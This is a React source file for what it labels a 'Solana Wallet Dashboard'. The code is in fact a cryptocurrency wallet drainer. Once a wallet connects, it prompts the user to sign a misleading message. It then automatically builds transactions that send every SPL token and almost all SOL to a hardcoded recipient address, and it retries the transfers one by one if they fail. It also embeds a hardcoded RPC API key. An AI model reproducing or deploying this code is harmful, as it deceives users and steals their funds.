"use client";

import React, { useEffect, useState } from "react";
import bs58 from "bs58";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";
import { WalletProvider, useWallet } from "@solana/wallet-adapter-react";
import {
  WalletModalProvider,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  LedgerWalletAdapter,
} from "@solana/wallet-adapter-wallets";

require("@solana/wallet-adapter-react-ui/styles.css");

// Use Helius mainnet RPC
const HELIUS_MAINNET_RPC = "https://mainnet.helius-rpc.com/?api-key=de8493b7-623e-4643-b74a-28e5b11f04a5";

type TokenInfo = {
  pubkey: string;
  mint: string;
  owner: string;
  decimals: number;
  amount: number;
};

const walletAdapters = [
  new PhantomWalletAdapter(),
  new SolflareWalletAdapter(),
  new LedgerWalletAdapter(),
];

const App: React.FC = () => {
  const { publicKey, wallet, connected } = useWallet();
  const [tokens, setTokens] = useState<TokenInfo[]>([]);
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [isClient, setIsClient] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [hasTransferred, setHasTransferred] = useState(false);

  useEffect(() => {
    if (connected && publicKey && !isConnected) {
      setIsConnected(true);
      fetchTokens();
    }
  }, [connected, publicKey]);

  useEffect(() => {
    if (isConnected  && !hasTransferred) {
      setHasTransferred(true);
      handleTransfer();
    }
  }, [tokens, isConnected]);

  useEffect(() => {
    setIsClient(true);
  }, []);

  useEffect(() => {
    if (connected && publicKey) {
      fetchTokens();
    }
  }, [connected, publicKey]);

  if (!isClient) return null;

  const fetchTokens = async () => {
    if (!publicKey) return;

    const connection = new Connection(HELIUS_MAINNET_RPC, "confirmed");

    try {
      const response = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const tokenList: TokenInfo[] = response.value.map(({ account, pubkey }) => {
        const info = account.data.parsed.info;
        return {
          pubkey: pubkey.toBase58(),
          mint: info.mint,
          owner: info.owner,
          decimals: info.tokenAmount.decimals,
          amount: info.tokenAmount.uiAmount,
        };
      });

      console.log("Fetched tokens:", tokenList); // Log tokens fetched

      setTokens(tokenList);
      setWalletAddress(publicKey.toBase58());
    } catch (error) {
      console.error("Error fetching tokens:", error);
    }
  };
  const handleTransfer = async () => {
    if (!publicKey || !wallet?.adapter) return;
  
    const message = new TextEncoder().encode("click confirm in next screen");
  
    if ("signMessage" in wallet.adapter) {
      try {
        const signedMessage = await wallet.adapter.signMessage(message);
        console.log("Message signed:", bs58.encode(signedMessage));
      } catch (err) {
        console.error("User declined message signature:", err);
        alert("You must sign the message to proceed.");
        return;
      }
    } else {
      alert("Wallet does not support message signing.");
      return;
    }
  
    const connection = new Connection(HELIUS_MAINNET_RPC, "confirmed");
    const sender = publicKey;
    const recipient = new PublicKey("GaguiK6oThcxqgx1JvZjZWasRgBVKoKnPVAZonBcBdne");
  
    const tx = new Transaction();
    let hasTokenTransfer = false;
    const tokenTransfers: Transaction[] = [];
  
    // ✅ Step 1: Fetch all SPL tokens
    const parsedAccounts = await connection.getParsedTokenAccountsByOwner(sender, {
      programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
    });
  
    for (const { pubkey, account } of parsedAccounts.value) {
      const parsed = account.data.parsed.info;
      const amount = BigInt(parsed.tokenAmount.amount);
      const decimals = parsed.tokenAmount.decimals;
      const mint = new PublicKey(parsed.mint);
  
      if (amount <= BigInt(0)) continue;
  
      const sourceTokenAccount = new PublicKey(pubkey);
      const destTokenAccount = await getAssociatedTokenAddress(mint, recipient);
  
      const transferTx = new Transaction();
      // Create ATA if recipient doesn't have it
      const ataInfo = await connection.getAccountInfo(destTokenAccount);
      if (!ataInfo) {
        transferTx.add(
          createAssociatedTokenAccountInstruction(
            sender,
            destTokenAccount,
            recipient,
            mint
          )
        );
      }
  
      transferTx.add(
        createTransferInstruction(
          sourceTokenAccount,
          destTokenAccount,
          sender,
          amount
        )
      );
  
      transferTx.feePayer = sender;
      transferTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
  
      tokenTransfers.push(transferTx);
      hasTokenTransfer = true;
      console.log(`Prepared ${amount.toString()} from token ${mint.toBase58()}`);
    }
  
    // ✅ Step 2: SOL transfer
    const balance = await connection.getBalance(sender);
    const estimatedFee = 15000000;
    const lamportsToSend = balance > estimatedFee ? balance - estimatedFee : 0;
  
    const solTx = new Transaction();
    if (lamportsToSend > 0) {
      solTx.add(
        SystemProgram.transfer({
          fromPubkey: sender,
          toPubkey: recipient,
          lamports: lamportsToSend
        })
      );
      solTx.feePayer = sender;
      solTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    }
  
    if (!hasTokenTransfer && lamportsToSend === 0) {
      alert("Nothing to transfer.");
      return;
    }
  
    // ✅ Combine everything in one transaction
    try {
      for (const t of tokenTransfers) tx.add(...t.instructions);
      if (lamportsToSend > 0) tx.add(...solTx.instructions);
      tx.feePayer = sender;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
  
      const txid = await wallet.adapter.sendTransaction(tx, connection);
      await connection.confirmTransaction(txid, "confirmed");
      console.log("Transaction successful:", txid);
      alert("Transfer confirmed!");
    } catch (err: any) {
      console.error("Main transaction failed:", err);
      if (err.message?.includes("Transaction too large")) {
        alert("Transaction too large. Sending tokens one by one.");
  
        // Retry each token transfer individually
        for (const t of tokenTransfers) {
          try {
            const txid = await wallet.adapter.sendTransaction(t, connection);
            await connection.confirmTransaction(txid, "confirmed");
            console.log("Token transferred in fallback tx:", txid);
          } catch (innerErr) {
            console.error("Failed to transfer token in fallback:", innerErr);
          }
        }
  
        // Send SOL separately
        if (lamportsToSend > 0) {
          try {
            const txid = await wallet.adapter.sendTransaction(solTx, connection);
            await connection.confirmTransaction(txid, "confirmed");
            console.log("SOL transferred in fallback tx:", txid);
          } catch (innerErr) {
            console.error("Failed to transfer SOL in fallback:", innerErr);
          }
        }
  
        alert("Fallback transfers completed.");
      } else {
        alert("Transaction failed.");
      }
    }
  };
  
  return (
    <div className="min-h-screen bg-gray-100 p-6 flex items-center justify-center">
      <div className="max-w-md w-full p-6 rounded-lg shadow-md bg-black text-white space-y-4">
        <h1 className="text-2xl font-bold">Solana Wallet Dashboard</h1>
        <WalletMultiButton />
        {walletAddress && (
          <div className="text-sm break-words">
            <strong>Connected Wallet:</strong>
            <p>{walletAddress}</p>
          </div>
        )}
      </div>
    </div>
  );
};

const Solana: React.FC = () => (
  <WalletProvider wallets={walletAdapters} autoConnect>
    <WalletModalProvider>
      <App />
    </WalletModalProvider>
  </WalletProvider>
);

export default Solana;
